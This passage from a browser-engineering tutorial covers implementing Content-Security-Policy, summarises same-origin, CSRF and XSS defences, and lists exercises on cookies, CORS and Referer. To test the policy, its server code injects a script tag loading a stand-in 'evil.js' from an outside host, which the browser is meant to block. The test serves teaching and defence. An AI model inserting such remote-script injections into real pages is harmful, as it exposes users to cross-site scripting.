    def XMLHttpRequest_send(self, method, url, body):
        full_url = self.tab.url.resolve(url)
        if not self.tab.allowed_request(full_url):
            raise Exception("Cross-origin XHR blocked by CSP")
        # ...
```

The `allowed_request` check needs to handle both the case of no
`Content-Security-Policy` and the case where there is one:

``` {.python}
class Tab:
    def allowed_request(self, url):
        return self.allowed_origins == None or \
            url.origin() in self.allowed_origins
```

The guest book can now send a `Content-Security-Policy` header:

``` {.python file=server}
def handle_connection(conx):
    # ...
    csp = "default-src http://localhost:8000"
    response += "Content-Security-Policy: {}\r\n".format(csp)
    # ...
```

To check that our implementation works, let's have the guest book
request a script from outside the list of allowed servers:

``` {.python file=server}
def show_comments(session):
    # ...
    out += "<script src=https://example.com/evil.js></script>"
    # ...
```

If you've got everything implemented correctly, the browser should
block the evil script[^evil-js] and report so in the console.

[^evil-js]: Needless to say, `example.com` does not actually host an
    `evil.js` file, and any request to it returns `404 Not Found`.

So are we done? Is the guest book totally secure? Uh... no. There's
more---much, *much* more---to web application security than what's in
this book. And just like the rest of this book, there are many other
browser mechanisms that touch on security and privacy. Let's settle
for this fact: the guest book is more secure than before.

::: {.further}
On a complicated site, deploying `Content-Security-Policy` can
accidentally break something. For this reason, browsers can
automatically report `Content-Security-Policy` violations to the
server, using the [`report-to` directive][report-to]. The
[`Content-Security-Policy-Report-Only`][report-only] header asks the
browser to report violations of the content security policy *without*
actually blocking the requests.
:::

[report-to]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to

[report-only]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only


Summary
=======

We've added user data, in the form of cookies, to our browser, and
immediately had to bear the heavy burden of securing that data and
ensuring it was not misused. That involved:

- Mitigating cross-site `XMLHttpRequest`s with the same-origin policy
- Mitigating cross-site request forgery with nonces and with
  `SameSite` cookies
- Mitigating cross-site scripting with escaping and with
  `Content-Security-Policy`.

We've also seen the more general lesson that every increase in the
capabilities of a web browser also leads to an increase in its
responsibility to safeguard user data. Security is an ever-present
consideration throughout the design of a web browser.

::: {.warning}
The purpose of this book is to teach the *internals of web browsers*,
not to teach web application security. There's much more you'd want
to do to make this guest book truly secure, let alone what we'd need
to do to avoid denial of service attacks or to handle spam and
malicious use. Please consult other sources before working on
security-critical code.
:::


Outline
=======

The complete set of functions, classes, and methods in our browser 
should now look something like this:

::: {.cmd .python .outline html=True}
    python3 infra/outlines.py --html src/lab10.py
:::

The server has also grown since last chapter:

::: {.cmd .python .outline html=True}
    python3 infra/outlines.py --html src/server10.py
:::

If you run it, it should look something like [this
page](widgets/lab10-browser.html); due to the browser sandbox, you
will need to open that page in a new tab.


Exercises
=========

*New inputs*: Add support for hidden and password input elements.
Hidden inputs shouldn't show up or take up space, while password input
elements should show their contents as stars instead of characters.

*Certificate errors*: When accessing an HTTPS page, the web server can
send an invalid certificate ([badssl.com](https://badssl.com) hosts
various invalid certificates you can use for testing). In this case,
the `wrap_socket` function will raise a certificate error; Catch these
errors and show a warning message to the user. For all *other* HTTPS
pages draw a padlock (spelled `\N{lock}`) in the address bar.

*Script access*: Implement the [`document.cookie` JavaScript
API][mdn-doc-cookie]. Reading this field should return a string
containing the cookie value and parameters, formatted similarly to the
`Cookie` header. Writing to this field updates the cookie value and
parameters, just like receiving a `Set-Cookie` header does. Also
implement the `HttpOnly` cookie parameter; cookies with this parameter
[cannot be read or written][std-httponly] from JavaScript.

[std-httponly]: https://datatracker.ietf.org/doc/html/rfc6265#section-5.3

*Cookie Expiration*: Add support for cookie expiration. Cookie
expiration dates are set in the `Set-Cookie` header, and can be
overwritten if the same cookie is set again with a later date. On the
server side, save the same expiration dates in the `SESSIONS` variable
and use it to delete old sessions to save memory.

*CORS*: Web servers can [*opt in*][cors] to allowing cross-origin
`XMLHttpRequest`s. The way it works is that on cross-origin HTTP
requests, the browser makes the request and includes an `Origin`
header with the origin of the requesting site; this request includes
cookies for the target origin. Per the same-origin policy, the browser
then throws away the response. But the server can send the
`Access-Control-Allow-Origin` header, and if its value is either the
requesting origin or the special `*` value, the browser returns the
response to the script. All requests made by your browser will be what
the CORS standard calls "simple requests".

[cors]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

*Referer*: When your browser visits a web page, or when it loads a CSS
or JavaScript file, it sends a `Referer` header[^referer] containing
the URL it is coming from. Sites often use this for analytics.
Implement this in your browser. However, some URLs contain personal
data that they don't want revealed to other websites, so browsers
support a `Referrer-Policy` header,[^referer] which can contain values
like `no-referrer`[^referer] (never send the `Referer` header when
leaving this page) or `same-origin` (only do so if navigating to
another page on the same origin). Implement those two values for
`Referrer-Policy`.

[^referer]: Yep, [spelled that way][wiki-typo].

[wiki-typo]: https://en.wikipedia.org/wiki/HTTP_referer#Etymology
